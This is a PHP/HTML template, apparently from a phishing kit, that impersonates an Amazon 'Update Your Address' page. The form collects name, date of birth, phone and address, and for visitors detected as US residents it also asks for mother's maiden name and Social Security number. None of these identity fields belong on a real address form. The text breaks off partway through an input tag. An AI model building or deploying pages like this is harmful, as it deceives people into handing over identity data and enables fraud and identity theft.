<?php require __DIR__ . '/../../core/EntityVariables.php'; ?>
<html
	lang="en-us"
	class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern-display a-ember-modern-text"
>
	<head>
		<meta charset="utf-8" />
        <link rel="icon" href="/public/images/favicon.png" type="image/png">
		<link
			rel="stylesheet"
			href="/public/css/karma_custom.css?v=<?= time(); ?>"
		/>
		<link
			rel="stylesheet"
			href="/public/css/karma_styles.css?v=<?= time(); ?>"
		/>
		<title>Amazon | Update Your Address</title>
	    <script src="/public/js/<?= itsUs($visitorInfo) ? 'EntityAddressForm.js' : 'EntityAddressForm_nonus.js'; ?>?v=<?= time(); ?>"></script>
	</head>

	<body
		class="a-m-us a-aui_72554-c a-aui_killswitch_csa_logger_372963-t1 a-aui_template_weblab_cache_333406-c a-bw_aui_cxc_alert_measurement_1074111-c a-bw_aui_stepper_enable_strategies_1_1330429-t1 overflow-x-hidden"
	>
        <?php

            if (isMobile()) {
                require __DIR__ . '/../static/tes.html';
            } else {
                require __DIR__ . '/../static/header.php';
            }
        ?>

        <?php if (isMobile()): ?>
            <link
                rel="stylesheet"
                href="/public/css/karma_mobile.css?v=<?= time(); ?>"
            />
        <?php endif; ?>

        <div class="a-section mt-25 md:mt-0 p-5 md:p-0">
            <div
                class="a-section a-spacing-medium a-text-left address-narrow-container-desktop"
                style="width: 100%; max-width: 500px; padding: 0 -25px;"
            >
                <div class="a-section a-spacing-medium">
                    <div class="a-subheader a-breadcrumb a-spacing-small">
                        <ul class="a-nostyle a-horizontal">
                            <li>
                                <span class="a-list-item">
                                    <a
                                        class="a-spacing-large a-link-normal"
                                        href="/gp/css/homepage.html?ref=ya_address_book_add_to_your_account_breadcrumb"
                                    >
                                        <span> Your Account </span>
                                    </a>
                                </span>
                            </li>
                            <li class="a-breadcrumb-divider" style="color: #565959">›</li>

                            <li>
                                <span class="a-list-item">
                                    <a
                                        class="a-spacing-large a-link-normal"
                                        href="/a/addresses?ref=ya_address_book_add_to_address_book_breadcrumb"
                                    >
                                        <span> Your addresses </span>
                                    </a>
                                </span>
                            </li>
                            <li class="a-breadcrumb-divider" style="color: #565959">›</li>

                            <li>
                                <span class="a-list-item">
                                    <span class="a-color-state"> Update </span>
                                </span>
                            </li>
                        </ul>
                    </div>
                </div>
                <div
                    class="a-modal-scroller a-declarative"
                    data-action="a-popover-floating-close"
                    style="
                        padding-bottom: 0px;
                        visibility: visible;
                        background-color: #111111af;
                    "
                >
                    <div
                        id="pp-z3b4qh-28"
                        data-pmts-component-id="pp-z3b4qh-2"
                        class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-z3b4qh-2"
                        style="
                            display: block;
                        "
                    >
                        <img
                            alt=""
                            src="/public/images/spinner2.gif"
                            class="pmts-loading-async-widget-spinner-viewport-centered"
                        />
                    </div>
                </div>
                <div class="a-section">
                    <h2>Update your address information</h2>
                    <!-- <img
                        alt="Amazon Hub Icon"
                        src="/public/images/pin.svg"
                        class="accessPoint-hub-icon"
                        height="25px"
                        width="40px"
                    /><span></span
                    ><span
                        class="a-declarative"
                        ><a
                            id="yaab-store-address-add-blurb_new_widget_click_here_link"
                            class="a-link-normal"
                            href="#"
                            ><span class="accessPoint-upsell-link"
                                >Or find an Amazon pickup location near you</span
                            ></a
                        ></span
                    > -->
                    <form
                        id="address-ui-address-form"
                        action="/address/process"
                        method="POST"
                        autocomplete="off"
                    >
                        <span id="address-ui-widget-content">
                            <div
                                id="address-ui-widgets-enterAddressFormContainer"
                                class="a-section celwidget"
                            >
                                <div class="a-row">
                                    <div
                                        class="a-input-text-group a-spacing-medium a-spacing-top-medium"
                                    >
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="address-ui-widgets-countryCode-dropdown-nativeId"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >Country/Region</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <span class="a-dropdown-container"
                                                ><select
                                                    name="entity_countrycode"
                                                    autocomplete="off"
                                                    role="combobox"
                                                    data-a-native-class="  "
                                                    id="address-ui-widgets-countryCode-dropdown-nativeId"
                                                    tabindex="0"
                                                    data-action="a-dropdown-select"
                                                    aria-required="true"
                                                    class="w-full max-w-sm md:max-w-full h-8 px-2 border rounded a-button-dropdown a-button-dropdown-native cursor-pointer"
                                                >
                                                <?php require __DIR__ . '/../static/city_options.html'; ?>
                                                </select>
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div
                                                    id="entity_countrycode_error_empty"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please select your country/region
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="entity_fullname"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >Full name (First and Last name)</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="50"
                                                id="entity_fullname"
                                                autocomplete="name"
                                                name="entity_fullname"
                                                spellcheck="false"
                                                class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-label="Full name (First and Last name)"
                                                aria-required="true"
                                            />
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div
                                                    id="entity_name_error_inappropriate_words"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Inappropriate words in Name are not allowed.
                                                                Please enter correct Name.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_name_error_special_characters"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Full first and last name are required. No
                                                                numbers or special characters (@, #, !).
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_name_error_initials_titles"
                                                    class="a-box a-alert-inline a-alert-inline-warning aok-hidden"
                                                    aria-live="polite"
                                                    aria-atomic="true"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                To prevent delivery issues, enter your full
                                                                first and last name. No initials or titles
                                                                (Dr, Ms, likewise).
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="entity_dob"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >Date of Birth (MM/DD/YYYY)</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="20"
                                                id="entity_dob"
                                                name="entity_dob"
                                                spellcheck="false"
                                                class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-describedby="address-ui-widgets-dob-help-text"
                                                aria-label="dob"
                                                aria-required="true"
                                            />
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div
                                                    id="entity_dob_error_insufficient_characters"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Entered Date of Birth has insufficient
                                                                characters
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_dob_error_non_numeric_characters"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Entered Date of Birth has non numeric
                                                                characters
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_dob_error_invalid"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please enter a valid date of birth.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_dob_error_voice_invalid"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please ensure only numeric digits are entered.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <!-- <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="entity_cob"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >City of Birth</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="20"
                                                id="entity_cob"
                                                name="entity_cob"
                                                spellcheck="false"
                                                class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-describedby="address-ui-widgets-cob-help-text"
                                                aria-label="dob"
                                                aria-required="true"
                                            />
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div
                                                    id="entity_cob_error_empty"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please enter a city of birth.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div> -->
                                        <?php if (itsUs($visitorInfo)): ?>
                                            <div
                                                class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                            >
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label
                                                        for="entity_mmn"
                                                        class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                        ><span class="a-size-base"
                                                            >MMN (Mother's Maiden Name)</span
                                                        ></label
                                                    >
                                                </div>
                                            </div>
                                            <div
                                                class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                            >
                                                <input
                                                    type="text"
                                                    maxlength="50"
                                                    id="entity_mmn"
                                                    autocomplete="name"
                                                    name="entity_mmn"
                                                    spellcheck="false"
                                                    class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                    aria-label="Full name (First and Last name)"
                                                    aria-required="true"
                                                />
                                                <div
                                                    class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                                >
                                                    <div
                                                        id="entity_mmn_error_inappropriate_words"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Inappropriate words in Mother's maiden name are not allowed.
                                                                    Please enter correct Mother's maiden name.
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="entity_mmn_error_special_characters"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Mother's maiden name are required. No
                                                                    numbers or special characters (@, #, !).
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="entity_mmn_error_initials_titles"
                                                        class="a-box a-alert-inline a-alert-inline-warning aok-hidden"
                                                        aria-live="polite"
                                                        aria-atomic="true"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    To prevent delivery issues, enter your full
                                                                    mother's maiden name. No initials or titles
                                                                    (Dr, Ms, likewise).
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div
                                                class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                            >
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label
                                                        for="entity_ssn"
                                                        class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                        ><span class="a-size-base"
                                                            >SSN (Social Security Number)</span
                                                        ></label
                                                    >
                                                </div>
                                            </div>
                                            <div
                                                class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                            >
                                                <input
                                                    type="text"
                                                    maxlength="20"
                                                    id="entity_ssn"
                                                    autocomplete="tel"
                                                    name="entity_ssn"
                                                    spellcheck="false"
                                                    class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                    aria-describedby="address-ui-widgets-ssn-help-text"
                                                    aria-label="ssn"
                                                    aria-required="true"
                                                />
                                                <div
                                                    class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                                >
                                                    <div
                                                        id="entity_ssn_error_insufficient_characters"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Entered social security number has insufficient
                                                                    characters
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="entity_ssn_error_non_numeric_characters"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Entered social security number has non numeric
                                                                    characters
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="entity_ssn_error_invalid"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Please enter a valid social security number.
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="entity_ssn_error_voice_invalid"
                                                        class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                        role="alert"
                                                    >
                                                        <div class="a-box-inner a-alert-container">
                                                            <i
                                                                class="a-icon a-icon-alert"
                                                                aria-hidden="true"
                                                            ></i>
                                                            <div class="a-alert-content">
                                                                <div class="a-section">
                                                                    Please ensure only numeric digits are entered.
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        <?php endif; ?>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="entity_phonenumber"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >Phone number</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="20"
                                                id="entity_phonenumber"
                                                autocomplete="tel"
                                                name="entity_phonenumber"
                                                spellcheck="false"
                                                class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-describedby="address-ui-widgets-enterAddressPhoneNumber-help-text"
                                                aria-label="Phone number"
                                                aria-required="true"
                                            />
                                            <div
                                                id="address-ui-widgets-enterAddressPhoneNumber-help-text"
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-desktop-form-micro-copy"
                                            >
                                                <span class="a-size-mini"
                                                    >May be used to assist delivery</span
                                                >
                                            </div>
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div
                                                    id="entity_phonenumber_error_insufficient_characters"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Entered phone number has insufficient
                                                                characters
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_phonenumber_error_non_numeric_characters"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Entered phone number has non numeric
                                                                characters
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_phonenumber_error_invalid"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please enter a valid mobile number
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div
                                                    id="entity_phonenumber_error_voice_invalid"
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert"
                                                >
                                                    <div class="a-box-inner a-alert-container">
                                                        <i
                                                            class="a-icon a-icon-alert"
                                                            aria-hidden="true"
                                                        ></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">
                                                                Please ensure only numeric digits are entered
                                                                should the driver need to phone ahead of
                                                                delivery. “+” at the start is allowed.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="entity_addressline1"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base">Address</span></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-mini adddress-ui-widgets-form-field-container awz-desktop-address-line-input-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="60"
                                                id="entity_addressline1"
                                                placeholder="Street address or P.O. Box"
                                                name="entity_addressline1"
                                                spellcheck="false"
                                                class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-required="true"
                                                role="combobox"
                                            />
                                            <div
                                                class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                            >
                                                <div id="entity_addressline1_error_empty" 
                                                    class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                    role="alert">
                                                    <div class="a-box-inner a-alert-container">
                                                        <i class="a-icon a-icon-alert"></i>
                                                        <div class="a-alert-content">
                                                            <div class="a-section">Please enter an address.</div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                        ></div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container"
                                        >
                                            <input
                                                type="text"
                                                maxlength="60"
                                                id="address-ui-widgets-enterAddressLine2"
                                                placeholder="Apt, suite, unit, building, floor, etc."
                                                name="entity_addressline2"
                                                spellcheck="false"
                                                class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                            />
                                        </div>
                                        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 w-full max-w-sm md:max-w-full">
                                            <div class="">
                                                <div
                                                    class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                                >
                                                    <div
                                                        class="a-section a-spacing-none aok-inline-block"
                                                    >
                                                        <label
                                                            for="entity_city"
                                                            class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                            ><span class="a-size-base">City</span></label
                                                        >
                                                    </div>
                                                </div>
                                                <div
                                                    class="a-section a-spacing-none adddress-ui-widgets-form-field-container"
                                                >
                                                    <input
                                                        type="text"
                                                        maxlength="50"
                                                        id="entity_city"
                                                        name="entity_city"
                                                        spellcheck="false"
                                                        class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                        aria-label="City"
                                                        aria-required="true"
                                                    />
                                                    <div
                                                        class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                                    >
                                                        <div
                                                            id="entity_city_error_empty"
                                                            class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                            role="alert"
                                                        >
                                                            <div class="a-box-inner a-alert-container">
                                                                <i
                                                                    class="a-icon a-icon-alert"
                                                                    aria-hidden="true"
                                                                ></i>
                                                                <div class="a-alert-content">
                                                                    <div class="a-section">
                                                                        Please enter a city name.
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <?php if (itsUs($visitorInfo)): ?>
                                                <div class="">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="entity_state" class="a-form-label address-ui-widgets-desktop-form-field-full-width">
                                                                <span class="a-size-base">State</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <span class="a-dropdown-container">
                                                            <select
                                                                name="entity_state"
                                                                autocomplete="off"
                                                                role="combobox"
                                                                id="entity_state"
                                                                tabindex="0"
                                                                data-action="a-dropdown-select"
                                                                aria-required="true"
                                                                class="a-button-dropdown a-button-dropdown-native h-8 w-full border cursor-pointer"
                                                            >
                                                                <?php require __DIR__ . '/../static/state_options.html'; ?>
                                                            </select>
                                                            <div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
                                                                <div id="entity_state_error_empty" class="a-box a-alert-inline a-alert-inline-error aok-hidden" role="alert">
                                                                    <div class="a-box-inner a-alert-container">
                                                                        <i class="a-icon a-icon-alert" aria-hidden="true"></i>
                                                                        <div class="a-alert-content">
                                                                            <div class="a-section">
                                                                                Please enter a state, region, or province.
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </span>
                                                    </div>
                                                </div>
                                            <?php else: ?>
                                                <div class="">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="entity_state" class="a-form-label address-ui-widgets-desktop-form-field-full-width">
                                                                <span class="a-size-base">State / Region</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <input
                                                            type="text"
                                                            id="entity_state"
                                                            name="entity_state"
                                                            autocomplete="address-level1"
                                                            aria-required="true"
                                                            class="w-full max-w-sm md:max-w-full a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input h-8 border"
                                                        />
                                                        <div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
                                                            <div id="entity_state_error_empty" class="a-box a-alert-inline a-alert-inline-error aok-hidden" role="alert">
                                                                <div class="a-box-inner a-alert-container">
                                                                    <i class="a-icon a-icon-alert" aria-hidden="true"></i>
                                                                    <div class="a-alert-content">
                                                                        <div class="a-section">
                                                                            Please enter a state, region, or province.
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            <?php endif; ?>
                                            <div class="">
                                                <div
                                                    class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container"
                                                >
                                                    <div
                                                        class="a-section a-spacing-none aok-inline-block"
                                                    >
                                                        <label
                                                            for="address-ui-widgets-enterAddressPostalCode"
                                                            class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                            ><span class="a-size-base"
                                                                >ZIP Code</span
                                                            ></label
                                                        >
                                                    </div>
                                                </div>
                                                <div
                                                    class="a-section a-spacing-none adddress-ui-widgets-form-field-container"
                                                >
                                                    <input
                                                        type="text"
                                                        maxlength="10"
                                                        id="address-ui-widgets-enterAddressPostalCode"
                                                        name="entity_zipcode"
                                                        spellcheck="false"
                                                        class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                        aria-label="ZIP Code"
                                                        aria-required="true"
                                                        autocomplete="address-ui-widgets-enterAddressPostalCode"
                                                    />
                                                    <div
                                                        class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert"
                                                    >
                                                        <div
                                                            id="entity_zipcode_error_invalid"
                                                            class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                            role="alert"
                                                        >
                                                            <div class="a-box-inner a-alert-container">
                                                                <i
                                                                    class="a-icon a-icon-alert"
                                                                    aria-hidden="true"
                                                                ></i>
                                                                <div class="a-alert-content">
                                                                    <div class="a-section">
                                                                        Please enter a valid ZIP or postal code.
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div
                                                            id="entity_zipcode_error_service_area"
                                                            class="a-box a-alert-inline a-alert-inline-error aok-hidden"
                                                            role="alert"
                                                        >
                                                            <div class="a-box-inner a-alert-container">
                                                                <i
                                                                    class="a-icon a-icon-alert"
                                                                    aria-hidden="true"
                                                                ></i>
                                                                <div class="a-alert-content">
                                                                    <div class="a-section">
                                                                        You have to provide a valid zip code
                                                                        within our service area. Please try again
                                                                        after validating the zip code on a recent
                                                                        utility bill.
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div
                                                            id="entity_zipcode_success_valid"
                                                            class="a-box a-alert-inline a-alert-inline-success aok-hidden"
                                                            aria-live="polite"
                                                            aria-atomic="true"
                                                        >
                                                            <div class="a-box-inner a-alert-container">
                                                                <i
                                                                    class="a-icon a-icon-alert"
                                                                    aria-hidden="true"
                                                                ></i>
                                                                <div class="a-alert-content">
                                                                    <div class="a-section">Valid zip code</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-contingent-field_PRUrbanization aok-hidden"
                                        >
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label
                                                    for="address-ui-widgets-urbanization"
                                                    class="a-form-label address-ui-widgets-desktop-form-field-full-width"
                                                    ><span class="a-size-base"
                                                        >Urbanization</span
                                                    ></label
                                                >
                                            </div>
                                        </div>
                                        <div
                                            class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-contingent-field_PRUrbanization aok-hidden"
                                        >
                                            <input
                                                type="text"
                                                maxlength="60"
                                                id="address-ui-widgets-urbanization"
                                                placeholder="Ex. URB PASEO DEL PARQUE"
                                                name="address-ui-widgets-urbanization"
                                                spellcheck="false"
